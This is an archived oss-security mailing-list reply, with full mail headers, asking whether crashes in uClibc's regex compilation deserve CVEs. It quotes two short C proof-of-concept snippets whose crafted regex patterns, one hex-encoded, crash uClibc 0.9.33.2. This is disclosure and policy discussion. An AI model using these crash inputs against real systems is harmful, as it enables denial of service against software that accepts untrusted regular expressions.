X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2252" "Friday" "16" "June" "2017" "13:44:37" "-0700" "Seth Arnold" "seth.arnold@canonical.com" "<20170616204437.GC2269@hunt>" "65" "Re: [oss-security] two vulns in  uClibc-0.9.33.2" "^Date:" nil nil "6" "2017061620:44:37" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        seth.arnold@ Jun 16   65/2252  " thread-indent "\"Re: [oss-security] two vulns in  uClibc-0.9.33.2\"\n") "<tencent_18C312B86EA079DA42B11D83@qq.com>" ("<tencent_18C312B86EA079DA42B11D83@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 16203 invoked by uid 550); 16 Jun 2017 20:44:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 16185 invoked from network); 16 Jun 2017 20:44:50 -0000
Message-ID: <20170616204437.GC2269@hunt>
Mail-Followup-To: oss-security@lists.openwall.com
References: <tencent_18C312B86EA079DA42B11D83@qq.com>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="KN5l+BnMqAQyZLvT"
Content-Disposition: inline
In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com>
User-Agent: Mutt/1.5.24 (2015-08-30)
Date: Fri, 16 Jun 2017 13:44:37 -0700
From: Seth Arnold <seth.arnold@canonical.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] two vulns in  uClibc-0.9.33.2
To: oss-security@lists.openwall.com

--KN5l+BnMqAQyZLvT
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

On Fri, Jun 16, 2017 at 11:53:09AM +0800, fefe wrote:
> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
> [...]
> The poc code like:
>=20=09
> 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB =
)=3D=3D0)
> 	{=09=09
>         	reg1match_t pmatch[1];
> 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
> 		regfree(&regtmp);
> 	}
>=20
> [...]
>=20
> The poc code like:=09
>=20=09
> 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3=
F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\x=
BD", REG_EXTENDED|REG_ICASE | REG_NOSUB )=3D=3D0)
> 	{=09=09
>         	reg1match_t pmatch[1];
> 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
> 		regfree(&regtmp);
> 	}

A question to the wider list:

Does it make sense to assign CVEs to regex compilation? Very few toolkits
handle this well, and even given how many regex toolkits use backtracking,
even 'safe' regexes can lead to essentially unbounded execution time.

Some regex engines like Rust's regex and Go's regex should handle
untrusted inputs well: they're non-backtracking engines and type-safe
languages.  Hypothetical crashes like this probably would qualify for
CVEs in either of these environments. But I'm less convinced it makes
sense with C-based engines to allow untrusted inputs.

http://www.etalabs.net/compare_libcs.html suggests that uclibc's regex is
DFA-based thus it's probably intended to allow untrusted inputs -- but is
that explicitely stated as a goal anywhere?

Thanks

--KN5l+BnMqAQyZLvT
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQEcBAEBCgAGBQJZREM1AAoJEPMhclmdjS6X/ToH/jc1YtF2nb4pbFxe0iaH+k7W
xTtrni84e4ec0jiHBFOaE5SeYDqYF2esyea8d70WxXVuLd2jf5xXnHhaa5Ghhncc
M7jcb5vNH3OFixQ8mhYWvYzu9m+coi0GC1vWbMf/xo3MMBX7ntfSyraSTM37y3+t
e/Z7q4O9g+LrvOAn21Y6Wb1/CUO8K1pvBskew4pFgeSH+cIJa1eDBHR9z5KRqGh0
7V5T6j/hdHRCUqRjaZaioSntRZYkaXRl4SSNN3g9cp4i5T6X1J5mPZlG323sY/fu
jWRiUmxUsaBz0w4xc3EGHoIKiQ9ojDYiNw9If5fmmLrIX/jwTZambagcALRkoqQ=
=Hevg
-----END PGP SIGNATURE-----

--KN5l+BnMqAQyZLvT--
